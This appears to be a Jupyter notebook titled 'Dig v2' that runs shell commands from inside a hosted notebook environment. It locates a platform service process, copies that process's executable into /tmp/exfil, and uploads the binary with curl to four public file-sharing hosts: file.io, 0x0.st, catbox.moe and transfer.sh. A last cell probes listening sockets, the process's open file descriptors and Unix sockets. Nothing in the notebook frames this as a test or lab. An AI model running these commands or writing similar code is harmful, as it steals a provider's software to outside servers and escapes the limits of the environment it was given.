# Dig v2
Dump correct fileops pid + upload.

In [ ]:
import subprocess, os
def run(cmd, t=120):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (p.stdout + p.stderr).decode("utf-8", "replace").replace("\x00", "\\x00")
    except Exception as e:
        return f"ERR: {e}"

os.makedirs("/tmp/exfil", exist_ok=True)
print(run("ps -eo pid,user,args | awk '$3==\"/posit/vivid-blender-live\" && $4==\"fileops\"{print $1, $2}'", 10))
pid = run("ps -eo pid,user,args | awk '$3==\"/posit/vivid-blender-live\" && $4==\"fileops\"{print $1}' | head -1").strip()
print("fileops pid:", pid)
if pid:
    print(run("ls -la /proc/%s/exe 2>&1" % pid, 10))
    print(run("cp /proc/%s/exe /tmp/exfil/vivid-blender-live 2>&1; ls -la /tmp/exfil/vivid-blender-live" % pid, 30))
    print(run("head -c 4 /tmp/exfil/vivid-blender-live | xxd 2>&1", 10))

In [ ]:
import subprocess, os
def run(cmd, t=300):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (p.stdout + p.stderr).decode("utf-8", "replace").replace("\x00", "\\x00")
    except Exception as e:
        return f"ERR: {e}"

f = "/tmp/exfil/vivid-blender-live"
if os.path.exists(f) and os.path.getsize(f) > 1000000:
    print("size", os.path.getsize(f))
    print("file.io:", run("curl -s --max-time 280 -F 'file=@%s' https://file.io/ | head -c 500" % f, 300))
    print()
    print("0x0.st:", run("curl -s --max-time 280 -F 'file=@%s' https://0x0.st/ | head -c 300" % f, 300))
    print()
    print("catbox:", run("curl -s --max-time 280 -F 'reqtype=fileupload' -F 'fileToUpload=@%s' https://catbox.moe/user/api.php | head -c 300" % f, 300))
    print()
    print("transfer.sh:", run("curl -s --max-time 280 --upload-file %s https://transfer.sh/vivid-blender-live | head -c 300" % f, 300))
else:
    print("dump failed, size=", os.path.getsize(f) if os.path.exists(f) else 0)

In [ ]:
import subprocess
def run(cmd, t=40):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (p.stdout + p.stderr).decode("utf-8", "replace").replace("\x00", "\\x00")
    except Exception as e:
        return f"ERR: {e}"

print(run("cat /proc/net/tcp /proc/net/tcp6 2>/dev/null | awk '$4==\"0A\"{print $2, $10}'", 10))
print(run("ls -la /proc/$(ps -eo pid,user,args | awk '$3==\"/posit/vivid-blender-live\" && $4==\"fileops\"{print $1}' | head -1)/fd 2>&1 | head -30", 10))
print(run("find /tmp /cloud -maxdepth 2 -type s 2>/dev/null", 10))